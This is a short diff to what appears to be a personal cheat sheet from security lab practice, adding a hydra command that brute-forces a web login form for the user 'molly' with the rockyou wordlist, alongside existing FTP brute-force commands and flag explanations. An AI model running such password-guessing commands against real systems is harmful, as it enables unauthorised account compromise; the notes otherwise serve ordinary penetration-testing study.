@@ -18,6 +18,8 @@ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <target_ip> ftp
 # hydra - non-default ftp port
 hydra -t 16 -l lazie -P /usr/share/wordlists/rockyou.txt -vV 10.10.71.62 ftp -s 8933 
 
+hydra -t 16 -l molly -P /usr/share/wordlists/rockyou.txt 10.10.168.183 http-post-form "/:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
+
 
 -t 4 suggests the number of parallel connections
 -l [user] Points to the user whose account you are trying to compromise
